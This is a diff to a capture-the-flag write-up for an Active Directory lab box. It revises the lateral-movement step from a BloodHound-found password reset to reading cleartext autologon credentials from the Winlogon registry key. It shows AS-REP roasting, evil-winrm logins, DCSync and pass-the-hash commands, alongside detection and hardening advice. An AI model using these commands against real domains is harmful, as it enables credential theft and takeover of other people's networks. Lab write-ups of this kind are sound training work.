@@ -15,7 +15,7 @@ tags: [windows, active-directory, kerberos, asrep, winrm, dcsync]
 
 ## TL;DR
 
-The corporate site publishes the team's names, so the username format comes for free. With the list, **AS-REP roasting** against the account without pre-authentication yields a crackable hash, and WinRM gives a shell. BloodHound shows `GenericAll` over a service account: reset its password and from there run **DCSync**.
+The corporate site publishes the team's names, so the username format comes for free. With the list, **AS-REP roasting** against the account without pre-authentication yields a crackable hash, and WinRM gives a shell. Inside, autologon credentials sit in cleartext in the registry; that service account holds replication rights and **DCSync** follows.
 
 ## Recon
 
@@ -56,14 +56,18 @@ type C:\Users\fsmith\Desktop\user.txt
 
 ## Lateral movement
 
-```bash
-bloodhound-python -u fsmith -p '<password>' -d egotistical-bank.htb -ns <TARGET_IP> -c All
-```
-
-BloodHound flags `GenericAll` from `fsmith` over the `svc_loanmgr` service account. Reset its password and log in as it:
+On the host, WinPEAS (or a direct query) reads the autologon credentials Windows stores in cleartext:
 
 ```powershell
-Set-ADAccountPassword -Identity svc_loanmgr -Reset -NewPassword (ConvertTo-SecureString '<newpass>' -AsPlainText -Force)
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+# DefaultUserName / DefaultPassword -> svc_loanmanager
+```
+
+Mind the name: the registry value is `svc_loanmanager`, but the real `sAMAccountName` is `svc_loanmgr`; the first one fails over WinRM. Check with NetExec and log in with the second:
+
+```bash
+nxc smb <TARGET_IP> -u svc_loanmgr -p '<password>'
+evil-winrm -i <TARGET_IP> -u svc_loanmgr -p '<password>'
 ```
 
 ## Escalation: DCSync
@@ -87,7 +91,7 @@ With Administrator's hash: `impacket-psexec -hashes ':<NT_HASH>' administrator@<
 
 - **4768** without pre-auth (AS-REP) and anomalous **4769**.
 - Clear `DONT_REQ_PREAUTH` on service accounts and enforce long passwords.
-- Audit `GenericAll`/`WriteDACL` over service accounts; do not delegate resets to regular users.
-- Review `DS-Replication-Get-Changes` and alert on `secretsdump` (DRSUAPI).
+- Never leave `DefaultPassword` in `Winlogon`: use LAPS or managed accounts for autologon.
+- Review `DS-Replication-Get-Changes` on service accounts and alert on `secretsdump` (DRSUAPI).
 
 MITRE: T1558.004, T1098, T1003.006.
